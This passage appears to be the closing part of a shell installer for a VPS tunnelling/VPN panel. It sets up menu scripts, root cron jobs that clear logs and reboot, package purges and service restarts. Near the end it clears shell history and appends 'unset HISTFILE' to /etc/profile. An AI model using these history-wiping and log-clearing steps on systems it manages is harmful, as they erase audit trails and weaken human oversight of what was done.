chmod +x sshovpnmenu
chmod +x l2tpmenu
chmod +x pptpmenu
chmod +x sstpmenu
chmod +x wgmenu
chmod +x ssmenu
chmod +x ssrmenu
chmod +x vmessmenu
chmod +x vlessmenu
chmod +x grpcmenu
chmod +x grpcupdate
chmod +x trmenu
chmod +x trgomenu
chmod +x setmenu
chmod +x slowdnsmenu
chmod +x running
chmod +x updatemenu


chmod +x portsshnontls
chmod +x portsshws

chmod +x slhost
chmod +x addhost
chmod +x menu
chmod +x addssh
chmod +x trialssh
chmod +x delssh
chmod +x member
chmod +x delexp
chmod +x cekssh
chmod +x restart
chmod +x speedtest
chmod +x info
chmod +x about
chmod +x autokill
chmod +x tendang
chmod +x ceklim
chmod +x ram
chmod +x renewssh
chmod +x clearlog
chmod +x changeport
chmod +x portovpn
chmod +x portwg
chmod +x porttrojan
chmod +x portsstp
chmod +x portsquid
chmod +x portvlm
chmod +x wbmn
chmod +x xp
chmod +x swapkvm
chmod +x addvmess
chmod +x addvless
chmod +x addtrojan
chmod +x addgrpc
chmod +x delgrpc
chmod +x delvmess
chmod +x delvless
chmod +x deltrojan
chmod +x cekgrpc
chmod +x cekvmess
chmod +x cekvless
chmod +x cektrojan
chmod +x renewgrpc
chmod +x renewvmess
chmod +x renewvless
chmod +x renewtrojan
chmod +x certv2ray
chmod +x addtrgo
chmod +x deltrgo
chmod +x renewtrgo
chmod +x cektrgo
echo "0 5 * * * root clearlog && reboot" >> /etc/crontab
echo "0 0 * * * root xp" >> /etc/crontab
echo "0 1 * * * root delexp" >> /etc/crontab
echo "10 4 * * * root clearlog && sslh-fix-reboot" >> /etc/crontab
echo "0 0 * * * root clearlog && reboot" >> /etc/crontab
echo "0 12 * * * root clearlog && reboot" >> /etc/crontab
echo "0 18 * * * root clearlog && reboot" >> /etc/crontab


# remove unnecessary files
cd
apt autoclean -y
apt -y remove --purge unscd
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove bind9*;
apt-get -y remove sendmail*
apt autoremove -y
# finishing
cd
chown -R www-data:www-data /home/vps/public_html
/etc/init.d/nginx restart
/etc/init.d/openvpn restart
/etc/init.d/cron restart
/etc/init.d/ssh restart
/etc/init.d/dropbear restart
/etc/init.d/fail2ban restart
/etc/init.d/sslh restart
/etc/init.d/stunnel5 restart
/etc/init.d/vnstat restart
/etc/init.d/fail2ban restart
/etc/init.d/squid restart
screen -dmS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7100 --max-clients 500
screen -dmS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7200 --max-clients 500
screen -dmS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 500
history -c
echo "unset HISTFILE" >> /etc/profile

cd
rm -f /root/key.pem
rm -f /root/cert.pem
rm -f /root/ssh-vpn.sh

# finihsing
clear
